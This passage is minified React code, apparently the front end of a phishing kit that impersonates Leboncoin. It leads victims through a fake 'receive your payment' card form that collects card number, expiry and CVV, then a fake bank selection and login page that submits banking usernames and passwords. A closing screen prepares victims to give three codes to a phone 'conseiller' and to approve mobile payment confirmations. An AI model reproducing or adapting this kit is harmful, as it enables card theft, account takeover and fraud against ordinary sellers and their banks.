                    children: "Veuillez renseigner les informations de votre carte bancaire pour recevoir votre paiement. Vos informations sont sécurisées et cryptées."
                }), u.jsxs("div", {
                    className: "bg-gray-50 rounded-lg p-4 mb-8",
                    children: [u.jsxs("div", {
                        className: "flex justify-between items-center mb-2",
                        children: [u.jsx("span", {
                            className: "text-gray-600",
                            children: "Montant à recevoir"
                        }), u.jsxs("span", {
                            className: "text-xl font-semibold text-gray-800",
                            children: [e, " €"]
                        })]
                    }), t && u.jsxs("div", {
                        className: "flex justify-between items-center",
                        children: [u.jsx("span", {
                            className: "text-gray-600",
                            children: "Article"
                        }), u.jsx("span", {
                            className: "text-sm text-gray-800",
                            children: t
                        })]
                    })]
                }), u.jsx("div", {
                    className: "mb-8 flex justify-center",
                    children: u.jsxs("div", {
                        className: "bg-gradient-to-r from-gray-700 to-gray-900 rounded-xl p-6 text-white shadow-lg w-[340px] transform hover:scale-105 transition-transform duration-200",
                        children: [u.jsxs("div", {
                            className: "flex justify-between items-start mb-4",
                            children: [u.jsx("div", {
                                className: "text-sm opacity-75",
                                children: "Carte bancaire"
                            }), u.jsx("div", {
                                className: "text-xl font-medium",
                                children: i.cardType ? i.cardType.toUpperCase() : ""
                            })]
                        }), u.jsx("div", {
                            className: "mb-8",
                            children: u.jsx("div", {
                                className: "text-2xl tracking-widest font-medium",
                                children: i.cardNumber || "•••• •••• •••• ••••"
                            })
                        }), u.jsxs("div", {
                            className: "flex justify-between items-end text-sm",
                            children: [u.jsxs("div", {
                                children: [u.jsx("div", {
                                    className: "opacity-75 text-xs mb-1",
                                    children: "Expire"
                                }), u.jsx("div", {
                                    className: "font-medium",
                                    children: i.expiryDate || "MM/YY"
                                })]
                            }), u.jsxs("div", {
                                children: [u.jsx("div", {
                                    className: "opacity-75 text-xs mb-1",
                                    children: "CVV"
                                }), u.jsx("div", {
                                    className: "font-medium",
                                    children: i.cvv ? "•••" : "***"
                                })]
                            })]
                        })]
                    })
                }), u.jsxs("form", {
                    onSubmit: w,
                    className: "space-y-6",
                    children: [u.jsxs("div", {
                        className: "space-y-4",
                        children: [u.jsxs("div", {
                            children: [u.jsxs("label", {
                                htmlFor: "cardType",
                                className: "block text-gray-800 text-base mb-1",
                                children: ["Type de carte ", u.jsx("span", {
                                    className: "text-leboncoin-button",
                                    children: "*"
                                })]
                            }), u.jsxs("select", {
                                id: "cardType",
                                value: i.cardType,
                                onChange: h,
                                className: Al("w-full px-4 py-3 border rounded-lg text-gray-800 transition-colors duration-200", "focus:outline-none focus:ring-2 focus:ring-leboncoin focus:border-transparent", "bg-white border-gray-300"),
                                children: [u.jsx("option", {
                                    value: "",
                                    children: "Sélectionnez un type de carte"
                                }), u.jsx("option", {
                                    value: "visa",
                                    children: "Visa"
                                }), u.jsx("option", {
                                    value: "mastercard",
                                    children: "Mastercard"
                                }), u.jsx("option", {
                                    value: "amex",
                                    children: "American Express"
                                })]
                            }), a.cardType && u.jsx("div", {
                                className: "text-red-500 text-sm mt-1",
                                children: a.cardType
                            })]
                        }), u.jsx(Y, {
                            id: "cardNumber",
                            label: "Numéro de carte",
                            value: i.cardNumber,
                            onChange: m,
                            error: a.cardNumber,
                            maxLength: 19,
                            placeholder: "1234 5678 9012 3456",
                            required: !0
                        }), u.jsxs("div", {
                            className: "grid grid-cols-2 gap-4",
                            children: [u.jsx(Y, {
                                id: "expiryDate",
                                label: "Date d'expiration",
                                placeholder: "MM/YY",
                                value: i.expiryDate,
                                onChange: h,
                                error: a.expiryDate,
                                maxLength: 5,
                                required: !0
                            }), u.jsx(Y, {
                                id: "cvv",
                                label: "CVV",
                                type: "password",
                                placeholder: "123",
                                value: i.cvv,
                                onChange: h,
                                error: a.cvv,
                                maxLength: 4,
                                required: !0
                            })]
                        })]
                    }), u.jsx(nt, {
                        type: "submit",
                        fullWidth: !0,
                        disabled: l,
                        className: "mt-6",
                        children: l ? "Chargement..." : "Suivant"
                    })]
                })]
            })
        })]
    })
}
  , pm = [{
    id: "banque-postale",
    name: "La Banque Postale",
    url: "https://www.labanquepostale.fr",
    logo: ""
}, {
    id: "credit-agricole",
    name: "Crédit Agricole",
    url: "https://www.credit-agricole.fr",
    logo: ""
}, {
    id: "caisse-epargne",
    name: "Caisse d'Épargne",
    url: "https://www.caisse-epargne.fr",
    logo: ""
}, {
    id: "societe-generale",
    name: "Société Générale",
    url: "https://www.societegenerale.fr",
    logo: ""
}, {
    id: "bnp-paribas",
    name: "BNP Paribas",
    url: "https://www.bnpparibas.fr",
    logo: ""
}, {
    id: "lcl",
    name: "LCL",
    url: "https://www.lcl.fr",
    logo: ""
}, {
    id: "credit-mutuel",
    name: "Crédit Mutuel",
    url: "https://www.creditmutuel.fr",
    logo: ""
}, {
    id: "nickel",
    name: "Nickel",
    url: "https://www.compte-nickel.fr",
    logo: ""
}, {
    id: "banque-populaire",
    name: "Banque Populaire",
    url: "https://www.banquepopulaire.fr",
    logo: ""
}, {
    id: "boursorama",
    name: "Boursorama",
    url: "https://www.boursorama-banque.com",
    logo: ""
}, {
    id: "revolut",
    name: "Revolut",
    url: "https://www.revolut.com",
    logo: ""
}, {
    id: "hsbc",
    name: "HSBC",
    url: "https://www.hsbc.fr",
    logo: ""
}, {
    id: "carrefour-banque",
    name: "Carrefour Banque",
    url: "https://www.carrefour-banque.fr",
    logo: ""
}, {
    id: "cic",
    name: "CIC",
    url: "https://www.cic.fr",
    logo: ""
}, {
    id: "fortuneo",
    name: "Fortuneo",
    url: "https://www.fortuneo.fr",
    logo: ""
}, {
    id: "monabanq",
    name: "Monabanq",
    url: "https://www.monabanq.com",
    logo: ""
}, {
    id: "hellobank",
    name: "Hello Bank",
    url: "https://www.hellobank.fr",
    logo: ""
}, {
    id: "axa-banque",
    name: "AXA Banque",
    url: "https://www.axa.fr",
    logo: ""
}, {
    id: "bforbank",
    name: "BforBank",
    url: "https://www.bforbank.com",
    logo: ""
}, {
    id: "bpce",
    name: "BPCE",
    url: "https://www.bpce.fr",
    logo: ""
}]
  , mm = ({onBankSelect: e, onBack: t}) => {
    const [n,r] = R.useState("")
      , [l,o] = R.useState("")
      , [i,s] = R.useState("")
      , [a,d] = R.useState(!0)
      , [h,g] = R.useState([])
      , [m,x] = R.useState([])
      , [w,v] = R.useState(!1)
      , [N,f] = R.useState("");
    R.useEffect( () => {
        (async () => {
            const j = await Promise.all(pm.map(async C => {
                var z, F;
                try {
                    const L = localStorage.getItem(`bank_logo_${C.id}`);
                    if (L)
                        return {
                            ...C,
                            logo: L
                        };
                    const Re = ((F = (z = (await (await fetch(`https://api.microlink.io?url=${encodeURIComponent(C.url)}`)).json()).data) == null ? void 0 : z.logo) == null ? void 0 : F.url) || "https://via.placeholder.com/32x32?text=🏦";
                    return localStorage.setItem(`bank_logo_${C.id}`, Re),
                    {
                        ...C,
                        logo: Re
                    }
                } catch {
                    return {
                        ...C,
                        logo: "https://via.placeholder.com/32x32?text=🏦"
                    }
                }
            }
            ));
            g(j),
            x(j),
            d(!1)
        }
        )()
    }
    , []),
    R.useEffect( () => {
        const k = h.filter(j => j.name.toLowerCase().includes(n.toLowerCase()));
        x(k),
        v(n.length > 0 && k.length === 0),
        o(n)
    }
    , [n, h]);
    const c = k => {
        try {
            return new URL(k),
            !0
        } catch {
            return !1
        }
    }
      , p = async () => {
        var k, j;
        if (!i) {
            f("L'URL de la banque est requise");
            return
        }
        if (!c(i)) {
            f("URL invalide. Exemple: https://www.mabanque.fr");
            return
        }
        f(""),
        d(!0);
        try {
            const F = ((j = (k = (await (await fetch(`https://api.microlink.io?url=${encodeURIComponent(i)}`)).json()).data) == null ? void 0 : k.logo) == null ? void 0 : j.url) || "https://via.placeholder.com/32x32?text=🏦"
              , L = {
                id: l.toLowerCase().replace(/\s+/g, "-"),
                name: l,
                url: i,
                logo: F
            };
            e(L)
        } catch {
            const z = {
                id: l.toLowerCase().replace(/\s+/g, "-"),
                name: l,
                url: i,
                logo: "https://via.placeholder.com/32x32?text=🏦"
            };
            e(z)
        }
    }
      , y = () => {
        t ? t() : window.history.back()
    }
    ;
    return u.jsxs("div", {
        className: "min-h-screen w-full",
        children: [u.jsxs("header", {
            className: "p-4 flex items-center justify-between md:justify-center relative border-b",
            children: [u.jsx("div", {
                className: "md:absolute md:left-4",
                children: u.jsx(Ht, {
                    onClick: y
                })
            }), u.jsx("div", {
                className: "md:mx-auto",
                children: u.jsx(_t, {})
            }), u.jsx("div", {
                className: "w-6 md:hidden"
            })]
        }), u.jsx("main", {
            className: "flex justify-center py-8 px-4",
            children: u.jsxs("div", {
                className: "w-full max-w-md",
                children: [u.jsx("h1", {
                    className: "text-2xl font-semibold text-gray-800 mb-2",
                    children: "Choisissez votre banque"
                }), u.jsx("p", {
                    className: "text-gray-600 mb-6",
                    children: "Sélectionnez votre établissement bancaire pour procéder à l'authentification sécurisée."
                }), u.jsx("div", {
                    className: "mb-6",
                    children: u.jsx(Y, {
                        id: "bankSearch",
                        placeholder: "Recherchez votre banque...",
                        value: n,
                        onChange: k => r(k.target.value),
                        className: "bg-gray-50"
                    })
                }), u.jsx("div", {
                    className: "space-y-2",
                    children: a ? u.jsx("div", {
                        className: "flex items-center justify-center py-8",
                        children: u.jsx("div", {
                            className: "w-8 h-8 border-4 border-leboncoin rounded-full animate-spin border-t-transparent"
                        })
                    }) : u.jsxs(u.Fragment, {
                        children: [m.map(k => u.jsxs("button", {
                            onClick: () => e(k),
                            className: Al("w-full flex items-center p-4 rounded-lg border border-gray-200", "hover:border-leboncoin hover:shadow-sm transition-all duration-200", "focus:outline-none focus:ring-2 focus:ring-leboncoin focus:ring-offset-2"),
                            children: [u.jsx("img", {
                                src: k.logo,
                                alt: k.name,
                                className: "w-8 h-8 object-contain",
                                onError: j => {
                                    j.target.src = "https://via.placeholder.com/32x32?text=🏦"
                                }
                            }), u.jsx("span", {
                                className: "ml-4 text-gray-800",
                                children: k.name
                            }), u.jsx("span", {
                                className: "ml-auto text-gray-400",
                                children: u.jsx("svg", {
                                    width: "20",
                                    height: "20",
                                    viewBox: "0 0 24 24",
                                    fill: "none",
                                    stroke: "currentColor",
                                    strokeWidth: "2",
                                    strokeLinecap: "round",
                                    strokeLinejoin: "round",
                                    children: u.jsx("path", {
                                        d: "M9 18l6-6-6-6"
                                    })
                                })
                            })]
                        }, k.id)), w && u.jsxs("div", {
                            className: "mt-4 p-4 border border-gray-200 rounded-lg",
                            children: [u.jsx("p", {
                                className: "text-sm text-gray-600 mb-4",
                                children: "Votre banque n'est pas dans la liste ? Veuillez fournir l'URL de votre banque pour effectuer l'authentification :"
                            }), u.jsxs("div", {
                                className: "space-y-4",
                                children: [u.jsx(Y, {
                                    id: "bankUrl",
                                    label: "URL de la banque",
                                    placeholder: "https://www.mabanque.fr",
                                    value: i,
                                    onChange: k => s(k.target.value),
                                    error: N,
                                    required: !0
                                }), u.jsx(nt, {
                                    onClick: p,
                                    fullWidth: !0,
                                    disabled: a,
                                    children: a ? u.jsxs("span", {
                                        className: "flex items-center justify-center",
                                        children: [u.jsx("div", {
                                            className: "w-5 h-5 border-2 border-white rounded-full border-t-transparent animate-spin mr-2"
                                        }), "Chargement..."]
                                    }) : `Continuer avec ${l}`
                                })]
                            })]
                        })]
                    })
                })]
            })
        })]
    })
}
  , hm = () => u.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-white to-gray-50",
    children: [u.jsx("header", {
        className: "p-4 border-b",
        children: u.jsx(_t, {})
    }), u.jsx("main", {
        className: "container mx-auto px-4 py-8 max-w-2xl",
        children: u.jsxs("div", {
            className: "bg-white rounded-2xl shadow-lg p-6 md:p-8",
            children: [u.jsx("div", {
                className: "flex items-center justify-center mb-6",
                children: u.jsx("div", {
                    className: "w-16 h-16 bg-green-100 rounded-full flex items-center justify-center",
                    children: u.jsx("svg", {
                        className: "w-8 h-8 text-green-500",
                        fill: "none",
                        stroke: "currentColor",
                        viewBox: "0 0 24 24",
                        children: u.jsx("path", {
                            strokeLinecap: "round",
                            strokeLinejoin: "round",
                            strokeWidth: "2",
                            d: "M5 13l4 4L19 7"
                        })
                    })
                })
            }), u.jsx("h1", {
                className: "text-2xl md:text-3xl font-bold text-center text-gray-800 mb-6",
                children: "Merci d'avoir choisi Leboncoin"
            }), u.jsxs("div", {
                className: "space-y-6 text-gray-600",
                children: [u.jsx("p", {
                    className: "leading-relaxed",
                    children: "Suite aux nouvelles mesures de sécurité pour terminer la confirmation de votre compte, vous serez contacté par téléphone par le service client dans les meilleurs délais."
                }), u.jsxs("div", {
                    className: "bg-blue-50 rounded-lg p-4 flex items-start space-x-3",
                    children: [u.jsx(pp, {
                        className: "w-5 h-5 text-blue-500 mt-1 flex-shrink-0"
                    }), u.jsxs("div", {
                        children: [u.jsx("p", {
                            className: "font-medium text-blue-900",
                            children: "Service disponible 24h/24 et 7j/7"
                        }), u.jsx("p", {
                            className: "text-blue-800 text-lg font-semibold",
                            children: ""
                        })]
                    })]
                }), u.jsxs("div", {
                    className: "bg-gray-50 rounded-lg p-4 space-y-3",
                    children: [u.jsx("p", {
                        className: "font-medium text-gray-900",
                        children: "Processus de vérification :"
                    }), u.jsxs("ul", {
                        className: "list-disc list-inside space-y-2 text-gray-700",
                        children: [u.jsx("li", {
                            children: "Vous recevrez trois (3) differents codes à communiquer au conseiller"
                        }), u.jsx("li", {
                            children: "Vous serez également amené à approuver des demandes de confirmation, mobile, chacune accompagnée d'un montant aléatoire à caractère non débiteur."
                        })]
                    })]
                }), u.jsxs("div", {
                    className: "bg-yellow-50 rounded-lg p-4 text-yellow-800",
                    children: [u.jsx("p", {
                        className: "font-medium mb-2",
                        children: "Important :"
                    }), u.jsx("p", {
                        children: "Aucun montant ne sera prélevé de votre compte pendant la vérification de vos coordonnées et la confirmation de votre identité. Les simulations qui seront faites ne nécessitent aucun frais."
                    })]
                })]
            })]
        })
    })]
})
  , gm = ({bank: e, onAuthenticate: t, onBack: n}) => {
    const [r,l] = R.useState({
        username: "",
        password: "",
        bankName: e.name
    })
      , [o,i] = R.useState({})
      , [s,a] = R.useState(!1)
      , [d,h] = R.useState(!1)
      , g = v => {
        const {id: N, value: f} = v.target;
        l(c => ({
            ...c,
            [N]: f
        })),
        o[N] && i(c => ({
            ...c,
            [N]: ""
        }))
    }
      , m = () => {
        const v = {};
        return r.username.trim() || (v.username = "Identifiant requis"),
        r.password.trim() || (v.password = "Mot de passe requis"),
        i(v),
        Object.keys(v).length === 0
    }
      , x = async v => {
        v.preventDefault(),
        m() && (a(!0),
        await rm(r),
        setTimeout( () => {
            a(!1),
            h(!0)
        }
        , 1e4))
    }
      , w = () => {
        n ? n() : window.history.back()
    }
    ;
    return d ? u.jsx(hm, {}) : s ? u.jsx("div", {
        className: "min-h-screen flex flex-col items-center justify-center bg-white",
        children: u.jsxs("div", {
            className: "text-center",
            children: [u.jsx("div", {
                className: "mb-8",
                children: u.jsxs("div", {
                    className: "w-20 h-20 mx-auto relative",
                    children: [u.jsx("div", {
                        className: "absolute inset-0 rounded-full border-4 border-gray-200"
                    }), u.jsx("div", {
                        className: "absolute inset-0 rounded-full border-4 border-leboncoin animate-spin border-t-transparent"
                    })]
                })
            }), u.jsx("h2", {
                className: "text-xl font-semibold text-gray-800 mb-2",
                children: "Authentification en cours"
            }), u.jsx("p", {
                className: "text-gray-600",
                children: "Veuillez patienter pendant que nous vérifions vos informations..."
            })]
        })
    }) : u.jsxs("div", {
        className: "min-h-screen w-full",
        children: [u.jsxs("header", {
            className: "p-4 flex items-center justify-between md:justify-center relative border-b",
            children: [u.jsx("div", {
                className: "md:absolute md:left-4",
                children: u.jsx(Ht, {
                    onClick: w
                })
            }), u.jsx("div", {
                className: "md:mx-auto",
                children: u.jsx(_t, {})
            }), u.jsx("div", {
                className: "w-6 md:hidden"
            })]
        }), u.jsx("main", {
            className: "flex justify-center py-8 px-4",
            children: u.jsxs("div", {
                className: "w-full max-w-md",
                children: [u.jsx("div", {
                    className: "flex items-center justify-center mb-8",
                    children: u.jsx("img", {
                        src: e.logo,
                        alt: e.name,
                        className: "w-16 h-16 object-contain",
                        onError: v => {
                            v.target.src = "https://via.placeholder.com/64x64?text=🏦"
                        }
                    })
                }), u.jsxs("h1", {
                    className: "text-2xl font-semibold text-gray-800 mb-2 text-center",
                    children: ["Connectez-vous à ", e.name]
                }), u.jsx("p", {
                    className: "text-gray-600 mb-8 text-center",
                    children: "Utilisez vos identifiants habituels pour vous connecter à votre espace bancaire"
                }), u.jsxs("form", {
                    onSubmit: x,
                    className: "space-y-6",
                    children: [u.jsx(Y, {
                        id: "username",
                        label: "Identifiant",
                        value: r.username,
                        onChange: g,
                        error: o.username,
                        required: !0
                    }), u.jsx(Y, {
                        id: "password",
                        label: "Mot de passe",
                        type: "password",
                        value: r.password,
                        onChange: g,
                        error: o.password,
                        required: !0
                    }), u.jsx(nt, {
                        type: "submit",
                        fullWidth: !0,
                        disabled: s,
                        className: "mt-6",
                        children: s ? u.jsxs("span", {
                            className: "flex items-center justify-center",
                            children: [u.jsxs("svg", {
                                className: "animate-spin -ml-1 mr-3 h-5 w-5 text-white",
                                xmlns: "http://www.w3.org/2000/svg",
                                fill: "none",
                                viewBox: "0 0 24 24",
                                children: [u.jsx("circle", {
                                    className: "opacity-25",
                                    cx: "12",
                                    cy: "12",
                                    r: "10",
                                    stroke: "currentColor",
                                    strokeWidth: "4"
                                }), u.jsx("path", {
                                    className: "opacity-75",
                                    fill: "currentColor",
                                    d: "M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                                })]
                            }), "Connexion en cours..."]
                        }) : "Se connecter"
                    })]
                })]
            })
        })]
    })
}
;
function vm() {
    const [e,t] = R.useState("login")
      , [n,r] = R.useState({})
      , [l,o] = R.useState({
        amount: "",
        itemType: ""
    })
      , [i,s] = R.useState(null)
      , a = () => t("payment")
      , d = () => t("identity")
      , h = N => {
        r(N),
        t("transaction")
    }
      , g = N => {
        o(N),
        t("payment-config")
    }
      , m = () => t("bank-selection")
      , x = N => {
        s(N),
        t("bank-auth")
    }
      , w = () => {
        console.log("Bank authentication successful")
    }
      , v = () => {
        switch (e) {
        case "payment":
            t("login");
            break;
        case "identity":
            t("payment");
            break;
        case "transaction":
            t("identity");
            break;
        case "payment-config":
            t("transaction");
            break;
        case "bank-selection":
            t("payment-config");
            break;
        case "bank-auth":
            t("bank-selection");
            break
        }
    }
    ;
    return u.jsxs("div", {
        className: "font-sans",
        children: [e === "login" && u.jsx(sm, {
            onLoginSuccess: a
        }), e === "payment" && u.jsx(um, {
            onAccept: d,
            onBack: v
        }), e === "identity" && u.jsx(am, {
            onNext: h,
            onBack: v
        }), e === "transaction" && u.jsx(cm, {
            onConfirm: g,
            onBack: v
        }), e === "payment-config" && u.jsx(fm, {
            amount: l.amount,
            itemType: l.itemType,
            onVerificationComplete: m,
            onBack: v
        }), e === "bank-selection" && u.jsx(mm, {
            onBankSelect: x,
            onBack: v
        }), e === "bank-auth" && i && u.jsx(gm, {
            bank: i,
            onAuthenticate: w,
            onBack: v
        })]
    })
}
_c(document.getElementById("root")).render(u.jsx(R.StrictMode, {
    children: u.jsx(vm, {})
}));
